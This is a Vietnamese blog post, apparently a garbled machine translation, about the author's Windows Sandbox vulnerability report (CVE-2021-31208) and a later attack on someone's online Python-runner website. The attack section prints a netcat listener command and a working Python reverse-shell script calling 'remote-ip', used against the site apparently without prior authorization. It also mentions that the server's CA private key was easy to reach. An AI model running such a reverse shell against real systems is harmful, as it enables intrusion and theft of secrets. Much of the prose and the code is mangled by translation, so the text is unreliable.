---
bố cục: bài
title: Về cách tìm lỗ hổng máy tính
các thẻ: [bảo mật, lỗ hổng bảo mật, mạng]
---

an ninh mạng? Nó không chỉ dành cho các chuyên gia. <! - more ->

# Nguyên nhân
Một tháng trước, tôi đã phát hiện ra một lỗ hổng nghiêm trọng trong hộp cát của Windows, điều này khiến tôi không thể tin vào tính bảo mật của các sản phẩm của Microsoft ... Nhưng hộp cát của Windows vẫn rất hữu ích. Tôi không muốn chỉ vì vấn đề bảo mật này. Hãy từ bỏ nó, vì vậy tôi đã báo cáo lỗ hổng này cho Microsoft.
Vì vậy, hai ngày hôm qua, Microsoft đã gửi cho tôi một email thông báo rằng lỗ hổng này đã được khắc phục và cảm ơn tôi vì những đóng góp của tôi trong việc bảo mật các sản phẩm của Microsoft. Mặc dù lời cảm ơn này và tôi không đưa bất kỳ khoản tiền nào, nhưng [trang mô tả lỗ hổng bảo mật] này (https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31208) có thể ghi tên tôi vào trang này. Tôi vẫn rất hạnh phúc.
Hôm mình nhận được tin này, mình mừng quá nên đã hack được một trang web khác 😂, chẳng lẽ tài năng của mình nằm ở chỗ bảo mật thông tin?

# Quy trình phát hiện lỗ hổng hộp cát của Windows và phương pháp lặp lại
Cách đây vài tháng, máy tính của tôi đã được cài đặt phiên bản Microsoft Edge Beta một cách không thể giải thích được. Sau khi cài đặt, máy tính của tôi có hai trình duyệt Edge. Ví dụ, tôi vẫn còn một chút trong sạch về những thứ trên máy tính, tôi không muốn những thứ thừa xuất hiện trên máy tính, tôi chắc chắn không thể chịu đựng được hai vấn đề về Edge như thế này. Vì vậy, tôi bắt đầu cố gắng gỡ cài đặt nó.
Nói chung, Edge Beta được cài đặt theo cách thủ công, vì vậy tình huống này sẽ được tìm thấy trong "Gỡ cài đặt hoặc thay đổi chương trình", nhưng cái này đã được cài đặt một cách khó hiểu, nên đương nhiên nó sẽ không xuất hiện trong danh sách đó. Tiếp theo, tôi bắt đầu tìm kiếm cách gỡ cài đặt Edge cưỡng bức. Câu trả lời trên Internet thường là tìm thư mục `Installer` trong thư mục kernel của trình duyệt, sau đó thực thi lệnh`. \ Setup.exe --uninstall-in this thư mục. -system-level --verbose-logging --force-uninstall` là OK. Do đó, rõ ràng là tôi đã đi đến thư mục trong phiên bản Beta để thực hiện lệnh này, và sau đó nó đã gỡ cài đặt phiên bản Edge chính thức của tôi ... Sau khi gỡ cài đặt, nó không chỉ để lại biểu tượng không thể xóa mà còn trong phiên bản Beta. 'không có cookie và trình cắm của tôi ...
Hai ngày sau, Windows được cập nhật, và sau khi cập nhật, phiên bản chính thức đã được cài đặt lại cho tôi ... Tôi thực sự không biết phải nói thế nào ... Sau đó, tôi nhận được Geek Uninstaller và cuối cùng là Edge Beta. đã làm phiền tôi trong một thời gian dài. Đã gỡ cài đặt.
Tôi rất khó chịu về điều trên. Sau khi bực mình, tôi muốn trút bỏ nhưng không thể trút được vào máy tính của mình, vì vậy tôi đã mở hộp cát Windows và gỡ cài đặt Edge khỏi hộp cát Windows. Chuyện gì đã xảy ra thế? Edge trên máy vật lý của tôi đã biến mất! Điều này thể hiện điều gì? Thao tác tôi thực hiện trong hộp cát có thực sự ảnh hưởng đến máy vật lý? Sau đó, tôi đã kiểm tra và thấy rằng Microsoft dường như ánh xạ thư mục `C: \ Program Files (x86) \ Microsoft \ Edge \ Application` trong máy vật lý vào hộp cát mà không có bất kỳ hạn chế nào. Điều này thực sự khủng khiếp. Bạn phải biết rằng một hộp cát tương đương với một nơi đáng tin cậy để thực hiện những điều nguy hiểm. Khi đó những người sử dụng nó sẽ không xem xét những thứ đang chạy bên trong có an toàn hay không. Có vẻ như đoạn mã do Asan viết thì không. tốt. cái gì. Nếu tôi viết một chương trình làm lây nhiễm tệp `msedge.exe`, chẳng hạn như thêm một trình bao hoặc một cái gì đó, hẳn sẽ có nhiều người sử dụng Edge trên máy vật lý. Ít nhất thị phần đã vượt quá Firefox. Một khi người bị nhiễm trong Cạnh của hộp chạy trên máy vật lý, máy vật lý sẽ rơi vào tình trạng nguy hiểm.
Lúc đầu, tôi phát hiện ra lỗ hổng này và tôi đã gửi nó trong trung tâm phản hồi, nhưng nó dường như vô dụng chút nào. Không ai ở Microsoft sẽ xem xét sự việc và ngay cả khi tôi nhìn thấy nó, tôi sẽ chỉ lặng lẽ sửa nó. phản hồi của bạn không khác gì rác rưởi.
Sau đó, tôi tìm kiếm trên Baidu về cách gửi lỗ hổng cho Microsoft, Baidu chỉ đơn giản là rác rưởi và không tìm thấy bất kỳ thông tin hữu ích nào. Sau khi đọc một thời gian dài, tôi thấy một bài báo nói rằng tôi có thể gửi email đến <secure @ microsoft. com> Phản hồi lỗi, vì vậy tôi đã viết một bài báo bằng tiếng Anh để báo cáo lỗi.
Nhưng phương pháp của tôi không đúng, vì Microsoft có một trang web dành riêng cho các lỗi phản hồi, đó là [Trung tâm phản hồi bảo mật của Microsoft] (https://www.microsoft.com/zh-cn/msrc/). Nếu bạn báo cáo trực tiếp qua email, tất nhiên họ sẽ trả lời, nhưng khả năng cao là bạn sẽ không nhận được tiền thưởng, vì báo cáo của mọi người thường có một định dạng, và bạn chắc chắn không biết phải viết định dạng nào trong email của chính mình. . Do đó, không thể tìm thấy trang web này khi một thư rác Baidu tìm kiếm để báo cáo lỗ hổng cho Microsoft. Tôi phát hiện ra rằng tôi có thể báo cáo tại đây sau khi tôi gửi email, vì vậy nếu bạn tìm thấy lỗ hổng Microsoft trong tương lai và muốn báo cáo nó, không sử dụng "Trung tâm phản hồi" spam, Không gửi email, tốt nhất là báo cáo lỗ hổng bảo mật trực tiếp [tại đây] (https://msrc.microsoft.com/create-report).
Một vấn đề khác là nếu bạn thực sự nhận được tiền thưởng, sẽ hơi phức tạp để nhận được nó, vì Microsoft không thể nói rằng họ yêu cầu bạn gửi mã thanh toán Alipay hoặc tương tự, bạn phải đăng ký HackerOne hoặc Bugcrowd tài khoản trước, và từ nước ngoài Rút tiền rất phiền phức, nên nếu không phải loại người thường xuyên tìm sơ hở, hoặc người trong công ty bảo mật thì căn bản tiền vẫn không được nhắc đến.
## Các yêu cầu về môi trường định kỳ
Cách sử dụng chung của lỗ hổng này bạn nên hiểu sau khi đọc phần trên, PoC? Làm thế nào tôi có thể viết những thứ như vậy? Bất kỳ kẻ ngốc nào cũng biết làm thế nào để kiểm tra nó, phải không? Vì vậy, nếu bạn muốn tái tạo lỗ hổng này, trước tiên bạn cần cài đặt Windows sandbox trên máy tính chạy Windows 10. Tôi không chắc về phiên bản có hiệu lực sớm nhất, vì lỗ hổng này bắt đầu khi Microsoft xóa hoàn toàn phiên bản Edge cũ khỏi máy tính. . Ngoài ra, hiện tại Nếu bạn muốn tái tạo lỗ hổng này, bạn không thể cài đặt bản vá [KB5003173] (https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB5003173). Nếu bạn cài đặt nó, bạn có thể gỡ cài đặt nó. Vì vậy, xét từ thời điểm hiện tại xuất bản bài viết này, miễn là bản vá KB5003173 được gỡ cài đặt trên Windows 10 mới nhất và sau đó hộp cát Windows được cài đặt, lỗ hổng có thể được tái tạo.
## CVE đầu tiên tôi đóng góp trong cuộc đời mình
Có vẻ như [CVE-2021-31208] (https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31208) đã được tôi đóng góp. Trong tương lai, tôi chỉ cần đăng nó lên của Microsoft [Danh sách xác nhận] (https: //msrc.microsoft.com/update-guide/acknowledgement), bạn có thể tìm kiếm lỗ hổng mà tôi đã tìm thấy bằng cách tìm kiếm Mayx. Mặc dù lỗ hổng này rất đơn giản, nhưng thật tuyệt khi có thể viết tên của tôi trong danh sách đó..

# Trang web tôi đã tấn công vào ngày hôm đó
Vào ngày 12 tháng 5, một người có tên [Kingfish404] (https://github.com/Kingfish404) đã chuyển blog của tôi và tôi nhìn thấy kịch bản để thu thập thông tin trên mạng tuyển dụng ngay từ cái nhìn đầu tiên. Tôi đã sợ đến mức nghĩ rằng đây là giáo viên của mình , bởi vì một dự án mà tôi tham gia gần đây là thu thập dữ liệu các trang web tuyển dụng khác nhau. Nói tóm lại, vì những lý do này, tôi đối với người này có chút hứng thú, cho nên mới nhìn đến kho hàng của Tạ gia. Nhìn vào đó, tôi thấy một [mã nguồn trang web học Python] (https://github.com/Kingfish404/LearnPython). Tôi muốn tạo một mã Python trực tuyến nguồn mở có thể tự động chạy cách đây khá lâu. Bài đánh giá trang web, như Python123, muốn viết một mã nguồn mở vì họ tính phí dịch vụ, nhưng vì quá nguy hiểm khi chạy trực tiếp trên máy chủ bằng Python, vì vậy tôi muốn viết một trang sử dụng Docker. Tôi đã chạy Python và đã ghi điểm nền tảng (có thể là k8s?), nhưng tiếc là trình độ của tôi có hạn, tôi không biết sử dụng Docker nên tôi không quan tâm nữa. Nhưng kể từ khi bạn nhìn thấy nó hôm nay, tại sao bạn không đọc nó? Hóa ra là người này đã viết phương pháp nguy hiểm mà tôi nói để chạy các tập lệnh Python. Tôi đã xem mã và sử dụng một chức năng kiểm tra bảo mật bị lỗi để ngăn chặn các cuộc tấn công ... Dù sao, vì có một trang web mẫu, chúng ta hãy thử. . Nói chung, loại shell ngược này cực kỳ đơn giản, nhưng tôi chỉ biết khái niệm, và tôi vẫn chưa biết cách sử dụng nó. Sau đó, tôi tìm kiếm nó và thấy [bài viết này] (http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). Hmm ... Trên thực tế, cuộc tấn công vẫn thú vị hơn cuộc tấn công trong CTF. Sau đó, tôi thực thi `nc -lvvp 1234` trên máy chủ của mình và thực thi nó trong hộp thực thi mã của nó:
`` trăn
nhập socket, quy trình con, hệ điều hành
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect (("remote-ip", 1234))
os.dup2 (s.fileno (), 0)
os.dup2 (s.fileno (), 1)
os.dup2 (s.fileno (), 2)
p = subprocess.call (["/ bin / sh", "- i"])
``
Bằng cách này, tôi đã trả lại Shell thành công. Mặc dù quyền hạn của Ta không cao, nhưng khóa riêng của chứng chỉ CA tiếp theo vẫn rất dễ dàng. Sau đó, tôi đã phản hồi cho người này và anh ta đóng cửa trang web.
Vì vậy nếu ai quan tâm và muốn xem cách hồi lại Shell thì cũng có thể tải code của Ta về và chơi thử.

# Tổng hợp
Theo quan điểm trên, việc tìm kiếm lỗ hổng chắc chắn không phải là điều mà những người đã học về mạng / an toàn thông tin làm được, ít ra mình cũng không phải dân chuyên nghiệp về an toàn thông tin nên chỉ cần có cách nghĩ là có thể chú ý được. đối mặt với vấn đề, chúng ta phải trực tiếp đối mặt với vấn đề. Chủ ý kích hoạt vấn đề, biết vấn đề ở đâu, đoán xem vấn đề có thể làm được gì, thì ai cũng có thể tìm ra sơ hở, dù có tìm ra cũng không thể nói ra. trở thành một vị thần vĩ đại ... Nhưng hãy nhìn vào điều này và ghi tên tôi vào sự thừa nhận. Mọi người có hạnh phúc không?
